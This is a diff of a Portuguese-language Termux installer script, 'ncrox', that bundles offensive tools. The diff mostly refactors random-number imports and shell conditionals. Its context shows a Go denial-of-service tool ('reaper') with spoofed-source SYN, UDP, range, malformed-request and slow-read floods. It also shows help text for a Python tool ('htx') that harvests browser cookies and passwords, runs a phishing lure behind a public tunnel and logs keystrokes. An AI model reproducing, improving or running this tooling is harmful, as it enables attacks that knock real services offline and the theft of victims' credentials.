@@ -1,5 +1,7 @@
 #!/data/data/com.termux/files/usr/bin/bash
 # ==========================================================================
+#  ncrox :: termux edition  —  single file  (v5)
+#  Porte do Satanachia ncrox + arsenal + nhack + htx/reaper/oztek
 #  Uso: bash ncrox.sh [install|update|restore]
 # ==========================================================================
 set -uo pipefail
@@ -190,7 +192,6 @@ class H(BaseHTTPRequestHandler):
 ThreadingHTTPServer(('0.0.0.0', PORT), H).serve_forever()
 PY
 
-  # ---------------------------------------------------------------- htx.py
   cat > "$TOOLS/htx.py" <<'PY'
 #!/usr/bin/env python3
 # htx.py — painel N3CR0-X + lure + keylog + zap silencioso + stego (zero deps)
@@ -1405,7 +1406,6 @@ if __name__ == "__main__":
     main()
 PY
 
-  # ---------------------------------------------------------------- reaper
   cat > "$TOOLS/reaper.go" <<'GO'
 package main
 
@@ -1414,7 +1414,7 @@ import (
 	"bytes"
 	"compress/zlib"
 	"context"
-	"crypto/rand"
+	crand "crypto/rand"
 	"crypto/tls"
 	"encoding/binary"
 	"encoding/hex"
@@ -1422,7 +1422,7 @@ import (
 	"flag"
 	"fmt"
 	"io"
-	"math/rand"
+	mrand "math/rand"
 	"net"
 	"net/http"
 	"net/url"
@@ -1474,7 +1474,7 @@ func banner() {
 
 func randStr(n int) string {
 	b := make([]byte, n)
-	rand.Read(b)
+	crand.Read(b)
 	for i := range b {
 		b[i] = alphabet[int(b[i])%len(alphabet)]
 	}
@@ -1490,7 +1490,7 @@ var uas = []string{
 	"curl/8.10.1",
 }
 
-func randUA() string { return uas[rand.Intn(len(uas))] }
+func randUA() string { return uas[mrand.Intn(len(uas))] }
 
 func isCDN(ip net.IP) string {
 	s := ip.String()
@@ -1858,7 +1858,7 @@ func noReadFlood(host string, port int, useTLS bool, path string, conc int, stop
 				case <-stop:
 					rstClose(c)
 					return
-				case <-time.After(time.Duration(6+rand.Intn(10)) * time.Second):
+				case <-time.After(time.Duration(6+mrand.Intn(10)) * time.Second):
 					rstClose(c)
 				}
 			}
@@ -1936,10 +1936,10 @@ func malformedFlood(host string, port int, useTLS bool, path string, conc int, s
 					continue
 				}
 				atomic.AddInt64(&connCount, 1)
-				tmpl := malformedTemplates[rand.Intn(len(malformedTemplates))]
+				tmpl := malformedTemplates[mrand.Intn(len(malformedTemplates))]
 				p := path + "/" + randStr(7)
-				if rand.Intn(6) == 0 {
-					p = path + "/" + randStr(3000+rand.Intn(6000))
+				if mrand.Intn(6) == 0 {
+					p = path + "/" + randStr(3000+mrand.Intn(6000))
 				}
 				c.SetWriteDeadline(time.Now().Add(3 * time.Second))
 				c.Write([]byte(fmt.Sprintf(tmpl, p, vhost)))
@@ -2070,7 +2070,7 @@ func rangeFlood(host string, port int, useTLS bool, file string, conc int, stop 
 				atomic.AddInt64(&connCount, 1)
 				req := "GET " + file + "?b=" + randStr(6) + " HTTP/1.1\r\nHost: " + vhost +
 					"\r\nUser-Agent: " + randUA() + "\r\nAccept: */*\r\nRange: bytes=0-" +
-					strconv.Itoa(2000000+rand.Intn(8000000)) + "\r\nConnection: keep-alive\r\n\r\n"
+					strconv.Itoa(2000000+mrand.Intn(8000000)) + "\r\nConnection: keep-alive\r\n\r\n"
 				conn.SetWriteDeadline(time.Now().Add(6 * time.Second))
 				if _, err := conn.Write([]byte(req)); err != nil {
 					conn.Close()
@@ -2152,9 +2152,9 @@ func udpFlood(host string, port, conc int, stop <-chan struct{}) {
 					return
 				default:
 				}
-				n := 64 + rand.Intn(1350)
+				n := 64 + mrand.Intn(1350)
 				b := make([]byte, n)
-				rand.Read(b)
+				crand.Read(b)
 				if _, err := conn.Write(b); err != nil {
 					time.Sleep(10 * time.Millisecond)
 					continue
@@ -2216,7 +2216,7 @@ func synFlood(dst net.IP, port, conc int, stop <-chan struct{}) {
 				default:
 				}
 				var rnd [8]byte
-				rand.Read(rnd[:])
+				crand.Read(rnd[:])
 				src := [4]byte{rnd[0]%223 + 1, rnd[1], rnd[2], rnd[3]}
 				for i := range buf {
 					buf[i] = 0
@@ -2931,7 +2931,6 @@ func main() {
 }
 GO
 
-  # ---------------------------------------------------------------- oztek
   cat > "$TOOLS/oztek.py" <<'PY'
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
@@ -3701,7 +3700,8 @@ PY
 #  build do reaper
 # ==========================================================================
 reap_build() {
-  command -v go >/dev/null 2>&1 || { printf '%s[*]%s instalando golang...\n' "$B" "$R"; pkg install -y golang >/dev/null 2>&1 || true; }
+  command -v go >/dev/null 2>&1 || {
+    printf '%s[*]%s instalando golang...\n' "$B" "$R"; pkg install -y golang >/dev/null 2>&1 || true; }
   command -v go >/dev/null 2>&1 || { printf '%s[!]%s golang indisponível\n' "$RD" "$R"; return 1; }
   local d="$TOOLS/reaper"; mkdir -p "$d" "$RBIN"
   cp "$TOOLS/reaper.go" "$d/main.go"
@@ -3713,11 +3713,10 @@ reap_build() {
   chmod +x "$RBIN/reaper"
   printf '%s[+]%s reaper em %s\n' "$G" "$R" "$RBIN/reaper"
 }
-````
 
-Segunda parte do arquivo (biblioteca, launchers, tema e instalação):
-
-```bash
+# ==========================================================================
+#  biblioteca
+# ==========================================================================
 write_lib() {
   mkdir -p "$(dirname "$LIB")"
   cat > "$LIB" <<'LIBEOF'
@@ -3728,6 +3727,7 @@ WL_DIR="$HOME/.ncrox/wordlists"
 HACK_DIR="$HOME/.ncrox/hack"
 TMPD="$HOME/.ncrox/tmp"
 TOOLS="$HOME/.ncrox/tools"
+RBIN="$HOME/.ncrox/bin"
 HACK_REPO="N3CR0-X/ncroxhack"
 WL_BASE="https://raw.githubusercontent.com/danielmiessler/SecLists/master"
 if [ -t 1 ]; then
@@ -4056,9 +4056,10 @@ ncx_nhack(){
 
 # ---------- arsenal pesado ----------
 ncx_htx(){
-  [ "${1:-}" = "-h" ] || [ "${1:-}" = "--help" ] && {
-    _tag "ncx-htx"
-    cat <<'H'
+  case "${1:-}" in
+    -h|--help)
+      _tag "ncx-htx"
+      cat <<'H'
   htx.py — colheita real de navegador + zap + lure + stego
 
   ncx-htx                       sobe painel + túnel público (QR do zap)
@@ -4073,7 +4074,8 @@ ncx_htx(){
   cdp  = Chrome com depuração (adb) — sessão viva, sem root
   root = /data/data com su ou tsu — cookies e senhas em disco
 H
-    _hr; return 0; }
+      _hr; return 0 ;;
+  esac
   if [ "${1:-}" = "wa" ] && ! command -v node >/dev/null 2>&1; then
     printf '%s[*]%s instalando nodejs para o modo zap...\n' "$B" "$R"; pkg install -y nodejs >/dev/null 2>&1 || true
   fi
@@ -4081,8 +4083,10 @@ H
 }
 ncx_reap(){
   local b="$RBIN/reaper"
-  [ -x "$b" ] || { printf '%s[*]%s reaper não compilado\n' "$B" "$R"; reap_build >/dev/null 2>&1 || {
-    printf '%s[!]%s build falhou (pkg install golang)\n' "$RD" "$R"; return 1; }; }
+  if [ ! -x "$b" ]; then
+    printf '%s[*]%s reaper não compilado, compilando...\n' "$B" "$R"
+    reap_build >/dev/null 2>&1 || { printf '%s[!]%s build falhou (pkg install golang)\n' "$RD" "$R"; return 1; }
+  fi
   "$b" "$@"
 }
 ncx_oz(){ python3 "$TOOLS/oztek.py" "$@"; }
@@ -4468,6 +4472,9 @@ LIBEOF
   printf '%s[+]%s biblioteca instalada\n' "$G" "$R"
 }
 
+# ==========================================================================
+#  launchers
+# ==========================================================================
 write_bins() {
   mkdir -p "$BIN"
   cat > "$BIN/ncrox" <<'EOF'
@@ -4532,6 +4539,9 @@ EOF
   printf '%s[+]%s launchers em %s\n' "$G" "$R" "$BIN"
 }
 
+# ==========================================================================
+#  tema
+# ==========================================================================
 write_prompt() {
   mkdir -p "$BK"; [ -f "$HOME/.bashrc" ] && cp "$HOME/.bashrc" "$BK/.bashrc"
   sed -i "/# >>> ncrox prompt >>>/,/# <<< ncrox prompt <<</d" "$HOME/.bashrc" 2>/dev/null
@@ -4598,6 +4608,9 @@ write_keys() {
   printf '%s[+]%s teclas configuradas\n' "$G" "$R"
 }
 
+# ==========================================================================
+#  instalação
+# ==========================================================================
 install() {
   need_termux
   banner
